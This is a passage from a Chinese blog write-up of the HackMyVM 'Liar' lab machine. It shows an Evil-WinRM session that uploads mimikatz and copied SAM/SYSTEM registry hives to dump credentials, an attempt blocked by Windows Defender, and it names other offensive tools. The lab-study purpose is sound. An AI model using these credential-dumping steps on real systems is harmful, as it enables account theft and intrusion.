9/15/2018   9:12 AM                Videos</span><br><span class="line">-a----       10/17/2024   7:02 PM         833472 PsExec64.exe</span><br><span class="line">-a----       10/17/2024   7:47 PM          51712 RunasCs.exe</span><br><span class="line">-a----        9/26/2023   6:44 PM             10 user.txt</span><br><span class="line">-a----       10/17/2024   7:52 PM         466944 wce-universal.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\nica&gt; <span class="built_in">cd</span> mimikatz</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; upload /root/Desktop/x64/mimikatz.exe</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /root/Desktop/x64/mimikatz.exe to C:\Users\nica\mimikatz\mimikatz.exe</span><br><span class="line">                                        </span><br><span class="line">Data: 1342324 bytes of 1342324 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; upload /root/Desktop/x64/mimidrv.sys</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /root/Desktop/x64/mimidrv.sys to C:\Users\nica\mimikatz\mimidrv.sys</span><br><span class="line">                                        </span><br><span class="line">Data: 48776 bytes of 48776 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; upload /root/Desktop/x64/mimilib.dll</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /root/Desktop/x64/mimilib.dll to C:\Users\nica\mimikatz\mimilib.dll</span><br><span class="line">                                        </span><br><span class="line">Data: 62324 bytes of 62324 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; upload /root/Desktop/x64/sam.hiv</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /root/Desktop/x64/sam.hiv to C:\Users\nica\mimikatz\sam.hiv</span><br><span class="line">                                        </span><br><span class="line">Data: 32768 bytes of 32768 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; upload /root/Desktop/x64/system.hiv</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /root/Desktop/x64/system.hiv to C:\Users\nica\mimikatz\system.hiv</span><br><span class="line">                                        </span><br><span class="line">Data: 12845056 bytes of 12845056 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directorio: C:\Users\nica\mimikatz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----       10/17/2024   8:36 PM          16406 mimidrv.sys</span><br><span class="line">-a----       10/17/2024   8:36 PM        1006744 mimikatz.exe</span><br><span class="line">-a----       10/17/2024   8:36 PM          46744 mimilib.dll</span><br><span class="line">-a----       10/17/2024   8:37 PM          24576 sam.hiv</span><br><span class="line">-a----       10/17/2024   8:37 PM        9633792 system.hiv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; mimikatz.exe</span><br><span class="line">The term <span class="string">&#x27;mimikatz.exe&#x27;</span> is not recognized as the name of a cmdlet, <span class="keyword">function</span>, script file, or operable program. Check the spelling of the name, or <span class="keyword">if</span> a path was included, verify that the path is correct and try again.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ mimikatz.exe</span><br><span class="line">+ ~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (mimikatz.exe:String) [], CommandNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : CommandNotFoundException</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; C:\Users\nica\mimikatz\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">……………………</span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; C:\Users\nica\mimikatz\mimikatz.exe</span><br><span class="line">The term <span class="string">&#x27;C:\Users\nica\mimikatz\mimikatz.exe&#x27;</span> is not recognized as the name of a cmdlet, <span class="keyword">function</span>, script file, or operable program. Check the spelling of the name, or <span class="keyword">if</span> a path was included, verify that the path is correct and try again.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ C:\Users\nica\mimikatz\mimikatz.exe</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (C:\Users\nica\mimikatz\mimikatz.exe:String) [], CommandNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : CommandNotFoundException</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directorio: C:\Users\nica\mimikatz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----       10/17/2024   8:36 PM          16406 mimidrv.sys</span><br><span class="line">-a----       10/17/2024   8:36 PM          46744 mimilib.dll</span><br><span class="line">-a----       10/17/2024   8:37 PM          24576 sam.hiv</span><br><span class="line">-a----       10/17/2024   8:37 PM        9633792 system.hiv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\mimikatz&gt;</span><br></pre></td></tr></table></figure>
<p>不断输出
<code>mimikatz #</code>，没法正常利用，直至输出结束后自动删掉
mimikatz.exe</p>
<p>基于 <code>akanksha</code> 用户 Shell 随上传后便会立即删掉【可利用
curl 上传下载】，后查询 Windows Defender
处于运行状态，推测应该就是它在防护的原因</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt;sc query WinDefend</span><br><span class="line">sc query WinDefend</span><br><span class="line"></span><br><span class="line">NOMBRE_SERVICIO: WinDefend </span><br><span class="line">        TIPO               : 10  WIN32_OWN_PROCESS  </span><br><span class="line">        ESTADO             : 4  RUNNING </span><br><span class="line">                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        C�D_SALIDA_WIN32   : 0  (0x0)</span><br><span class="line">        C�D_SALIDA_SERVICIO: 0  (0x0)</span><br><span class="line">        PUNTO_COMPROB.     : 0x0</span><br><span class="line">        INDICACI�N_INICIO  : 0x0</span><br><span class="line"></span><br><span class="line">c:\&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="参考">3. 参考</h2>
<ul>
<li><a
target="_blank" rel="noopener" href="https://book.hacktricks.xyz/cn/network-services-pentesting/5985-5986-pentesting-winrm">5985,5986
- Pentesting WinRM | HackTricks</a><br />
</li>
<li><a target="_blank" rel="noopener" href="https://0x-noname.github.io/writeups/hmv/liar/">HackMyVM -
Liar | noname</a><br />
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs">GitHub -
antonioCoco/RunasCs: RunasCs - Csharp and open version of windows
builtin runas.exe</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Phantom
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://z9m8r8.github.io/2024/10/17/Liar/" title="HackMyVM - Liar">https://z9m8r8.github.io/2024/10/17/Liar/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
              <a href="/tags/HackMyVM/" rel="tag"><i class="fa fa-tag"></i> HackMyVM</a>
              <a href="/tags/medusa/" rel="tag"><i class="fa fa-tag"></i> medusa</a>
              <a href="/tags/hydra/" rel="tag"><i class="fa fa-tag"></i> hydra</a>
              <a href="/tags/crackmapexec/" rel="tag"><i class="fa fa-tag"></i> crackmapexec</a>
              <a href="/tags/WinRM/" rel="tag"><i class="fa fa-tag"></i> WinRM</a>
              <a href="/tags/Evil-Winrm/" rel="tag"><i class="fa fa-tag"></i> Evil-Winrm</a>
              <a href="/tags/RunasCs/" rel="tag"><i class="fa fa-tag"></i> RunasCs</a>
              <a href="/tags/Windows/" rel="tag"><i class="fa fa-tag"></i> Windows</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/10/14/FristiLeaks%201.3/" rel="prev" title="FristiLeaks: 1.3">
                  <i class="fa fa-angle-left"></i> FristiLeaks: 1.3
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/10/19/SickOs%201.1/" rel="next" title="SickOs: 1.1">
                  SickOs: 1.1 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2020 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Phantom</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">314k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">19:01</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/10/17/Liar/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
